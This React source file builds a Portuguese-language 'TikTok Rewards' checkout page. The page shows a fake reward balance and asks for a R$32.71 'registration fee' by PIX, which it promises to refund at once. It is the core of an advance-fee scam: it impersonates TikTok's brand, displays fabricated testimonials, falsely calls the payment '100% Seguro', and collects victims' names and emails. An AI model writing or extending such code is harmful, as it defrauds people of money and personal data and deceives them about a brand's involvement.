import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { trackTikTokEvent } from "@/lib/tiktok-tracking";
import { CheckCircle2, Star, User, Loader2, Copy, Check } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "@/hooks/use-toast";
import { TARGET_BALANCE } from "@/lib/constants";
import tiktokLogo from "@/assets/tiktok-logo.png";
import tiktokRound from "@/assets/tiktok-round.png";
import pixLogo3 from "@/assets/pix-logo-icon-3.png";
import testimonialMatheus from "@/assets/testimonial-matheus.png";
import testimonialAna from "@/assets/testimonial-ana.png";
import testimonialCarlos from "@/assets/testimonial-carlos.png";

const TAX = 32.71;
const SALDO = TARGET_BALANCE;

const testimonials = [
  {
    name: "Matheus Henrique Santos",
    text: '"rapazz e nao foi que esse ngc do gol de premios deu boa aqui tbm familia KKKKKK"',
    avatar: testimonialMatheus,
  },
  {
    name: "Ana Paula Silva",
    text: '"recebi em menos de 2 minutos, muito rápido! recomendo demais"',
    avatar: testimonialAna,
  },
  {
    name: "Carlos Eduardo",
    text: '"pensei que era golpe mas recebi certinho, top demais!!"',
    avatar: testimonialCarlos,
  },
];

const Pagamento = () => {
  useEffect(() => {
    trackTikTokEvent({ event: "AddPaymentInfo", properties: { value: TAX, currency: "BRL" } });
  }, []);
  const [email, setEmail] = useState("");
  const [nomeCompleto, setNomeCompleto] = useState("");
  const [loading, setLoading] = useState(false);
  const [pixData, setPixData] = useState<{
    qr_code: string;
    qr_code_base64: string;
    transaction_id: number;
  } | null>(null);
  const [copied, setCopied] = useState(false);

  const handlePagar = async () => {
    setLoading(true);
    try {
      const reference = `TK-${Date.now()}-${Math.random().toString(36).substring(2, 8)}`;

      const { data, error } = await supabase.functions.invoke("create-pix-payment", {
        body: {
          amount: Math.round(TAX * 100),
          description: "Taxa de Cadastro - TikTok Rewards",
          reference,
          source: "api_externa",
          customer: {
            name: nomeCompleto.trim(),
            email: email.trim(),
            document: "00000000000",
            phone: "00000000000",
          },
        },
      });

      if (error) throw error;

      if (data?.status === "success" || data?.qr_code) {
        setPixData({
          qr_code: data.qr_code,
          qr_code_base64: data.qr_code_base64,
          transaction_id: data.transaction_id,
        });
        trackTikTokEvent({ event: "CompletePayment", properties: { value: TAX, currency: "BRL", transaction_id: data.transaction_id } });
      } else {
        throw new Error(data?.error || "Erro ao gerar pagamento");
      }
    } catch (err: unknown) {
      console.error("Payment error:", err);
      toast({
        title: "Erro no pagamento",
        description: err instanceof Error ? err.message : "Tente novamente em instantes.",
        variant: "destructive",
      });
    } finally {
      setLoading(false);
    }
  };

  const handleCopyPix = async () => {
    if (!pixData?.qr_code) return;
    await navigator.clipboard.writeText(pixData.qr_code);
    setCopied(true);
    toast({ title: "Código PIX copiado!" });
    setTimeout(() => setCopied(false), 3000);
  };

  const isFormValid = email.trim() && nomeCompleto.trim();

  // Show QR code screen after payment generated
  if (pixData) {
    return (
      <div className="flex min-h-screen flex-col bg-gray-50">
        <div className="bg-primary py-3 text-center">
          <p className="text-sm font-bold text-primary-foreground">Pagamento 100% Seguro</p>
        </div>
        <div className="px-4 py-6 space-y-5 max-w-md mx-auto w-full">
          <div className="flex justify-center">
            <img src={tiktokLogo} alt="TikTok" className="h-8" loading="eager" decoding="async" />
          </div>

          <div className="rounded-2xl bg-white border border-gray-200 p-6 text-center space-y-4">
            <CheckCircle2 className="h-10 w-10 text-green-500 mx-auto" />
            <h2 className="text-lg font-bold text-black">PIX Gerado com Sucesso!</h2>
            <p className="text-sm text-gray-500">Escaneie o QR Code ou copie o código abaixo</p>

            {pixData.qr_code_base64 && (
              <div className="flex justify-center">
                <img
                  src={pixData.qr_code_base64}
                  alt="QR Code PIX"
                  className="w-48 h-48 rounded-xl"
                  loading="eager"
                  decoding="async"
                />
              </div>
            )}

            <div className="bg-gray-50 rounded-xl p-3">
              <p className="text-[10px] text-gray-400 mb-1">Código PIX Copia e Cola</p>
              <p className="text-xs text-black font-mono break-all leading-relaxed">
                {pixData.qr_code.substring(0, 80)}...
              </p>
            </div>

            <Button
              onClick={handleCopyPix}
              className="w-full h-12 rounded-2xl text-sm font-bold bg-primary hover:bg-primary/90 text-primary-foreground"
            >
              {copied ? (
                <>
                  <Check className="h-4 w-4 mr-2" /> Copiado!
                </>
              ) : (
                <>
                  <Copy className="h-4 w-4 mr-2" /> Copiar Código PIX
                </>
              )}
            </Button>

            <p className="text-xs text-gray-400">
              Após o pagamento, a confirmação é automática em até 2 minutos.
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="flex min-h-screen flex-col bg-gray-50">
      {/* Top banner */}
      <div className="bg-primary py-3 text-center">
        <p className="text-sm font-bold text-primary-foreground">Pagamento 100% Seguro</p>
      </div>

      <div className="px-4 py-6 space-y-5">
        {/* Header with logo and saldo */}
        <div className="flex items-center justify-between">
          <img src={tiktokLogo} alt="TikTok" className="h-8" loading="eager" decoding="async" />
          <div className="rounded-full border-2 border-transparent px-4 py-1.5" style={{ background: "linear-gradient(#000, #000) padding-box, linear-gradient(135deg, #25F4EE, #FE2B54) border-box", borderRadius: 999 }}>
            <p className="text-[10px] text-gray-400 leading-none">Saldo:</p>
            <p className="text-sm font-bold text-white">R$ {SALDO.toFixed(2).replace(".", ",")}</p>
          </div>
        </div>

        {/* Info banner */}
        <div className="rounded-xl bg-black px-4 py-3 text-center space-y-0.5">
          <p className="text-xs font-semibold text-white">Confirmação instantânea</p>
          <p className="text-[11px] text-gray-400">Reembolso automático via PIX em instantes</p>
        </div>

        {/* Product card */}
        <div className="rounded-2xl bg-white border border-gray-200 p-5">
          <div className="flex items-center gap-4 mb-4">
            <div className="h-14 w-14 rounded-2xl overflow-hidden shrink-0">
              <img src={tiktokRound} alt="TikTok" className="h-full w-full object-cover" loading="eager" decoding="async" />
            </div>
            <div>
              <p className="text-sm font-bold text-black">Taxa De Cadastro</p>
              <p className="text-xs text-green-500 font-medium">Verificação de Identidade</p>
            </div>
          </div>
        </div>

        {/* Identificação */}
        <div className="rounded-2xl bg-white border border-gray-200 p-5">
          <div className="flex items-center gap-2 mb-5">
            <div className="h-8 w-8 rounded-full bg-primary/10 flex items-center justify-center">
              <User className="h-4 w-4 text-primary" />
            </div>
            <h3 className="text-lg font-bold text-black">Identificação</h3>
          </div>

          <div className="space-y-4">
            <div>
              <label className="text-sm font-semibold text-black block mb-2">Email</label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Email"
                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-base text-black placeholder:text-gray-300 outline-none focus:border-primary"
              />
            </div>
            <div>
              <label className="text-sm font-semibold text-black block mb-2">Nome completo</label>
              <input
                type="text"
                value={nomeCompleto}
                onChange={(e) => setNomeCompleto(e.target.value)}
                placeholder="Nome e sobrenome"
                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-base text-black placeholder:text-gray-300 outline-none focus:border-primary"
              />
            </div>
          </div>
        </div>

        {/* Método de pagamento */}
        <div className="rounded-2xl bg-white border border-gray-200 p-5">
          <h3 className="text-xl font-bold text-black mb-4">Escolha um método de pagamento...</h3>
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <img src={pixLogo3} alt="Pix" className="h-6 w-6" loading="eager" decoding="async" />
              <div>
                <p className="text-sm font-bold text-black">Pagamento via Pix</p>
                <p className="text-xs text-gray-400">Reembolso imediato.</p>
              </div>
            </div>
            
          </div>
        </div>

        {/* Pagar button */}
        <Button
          onClick={handlePagar}
          disabled={!isFormValid || loading}
          className="w-full h-14 rounded-2xl text-base font-bold bg-primary hover:bg-primary/90 text-primary-foreground uppercase tracking-wider disabled:opacity-40"
        >
          {loading ? (
            <>
              <Loader2 className="h-5 w-5 mr-2 animate-spin" /> Gerando PIX...
            </>
          ) : (
            "Pagar"
          )}
        </Button>


        {/* Testimonials */}
        <div className="flex gap-4 overflow-x-auto pb-4 -mx-4 px-4">
          {testimonials.map((t) => (
            <div key={t.name} className="min-w-[260px] rounded-2xl bg-white border border-gray-200 p-4">
              <div className="flex items-center gap-3 mb-2">
                <div className="h-10 w-10 rounded-full overflow-hidden shrink-0">
                  <img src={t.avatar} alt={t.name} className="h-full w-full object-cover" loading="eager" decoding="async" />
                </div>
                <div>
                  <p className="text-sm font-bold text-black">{t.name}</p>
                  <div className="flex gap-0.5">
                    {Array.from({ length: 5 }).map((_, i) => (
                      <Star key={i} className="h-3 w-3 fill-yellow-400 text-yellow-400" />
                    ))}
                  </div>
                </div>
              </div>
              <p className="text-xs text-gray-500 leading-relaxed">{t.text}</p>
            </div>
          ))}
        </div>

        <p className="text-xs text-gray-400 text-center leading-relaxed pt-4 pb-2">
          Ao finalizar o pagamento você concorda com os termos de uso e privacidade do TikTok.
        </p>
      </div>
    </div>
  );
};

export default Pagamento;
